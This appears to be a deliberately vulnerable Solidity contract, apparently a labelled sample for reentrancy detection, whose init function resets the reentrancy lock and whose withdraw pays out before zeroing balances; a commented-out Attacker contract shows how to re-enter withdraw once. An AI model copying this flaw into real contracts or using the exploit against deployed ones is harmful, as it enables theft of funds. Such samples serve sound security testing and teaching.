// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

contract CrossDoubleInit_ree1 {

    bool private flag;
    mapping (address => uint256) public balances;
    uint256 public currentVersion;
    bool private initializedV2;

    modifier nonReentrant() {
        require(!flag, "Locked");
        flag = true;
        _;
        flag = false;
    }

    constructor (){
        flag = false;
        currentVersion = 2;
    }

    // an attacker can reenter here after calling withdraw, and setting the flag to false, allowing them to reenter once
    // this works only if initalizePoolV2() has never been called
    function initializePoolV2() external {
        if (initializedV2) {
            revert("Already IntializedV2");
        }
        initializedV2 = true;
        currentVersion = 2;
        flag = false;
    }

    function withdraw() nonReentrant public {
        uint amt = balances[msg.sender];
        require(amt > 0, "Insufficient funds");
        (bool success, ) = msg.sender.call{value:amt}("");
        require(success, "Call failed");
        balances[msg.sender] = 0;
    }

    function deposit() nonReentrant public payable {
        balances[msg.sender] += msg.value;       
    }

}

// contract Attacker {
//     C private c;
//     address to;
//     constructor(address v, address _to) {
//         to = _to;
//         c = C(v);
//     }
//     function attack() public {
//         c.deposit{value: 100}();
//         c.withdraw();
//         // now, if the address 'to' calls withdraw() then both the attacker and 'to' will own 100 each
//     }
//     receive() external payable {
//         c.initializePoolV2(); // setting the flag back to false allows to reenter withdraw exactly once
//         c.withdraw();
//     } 
// }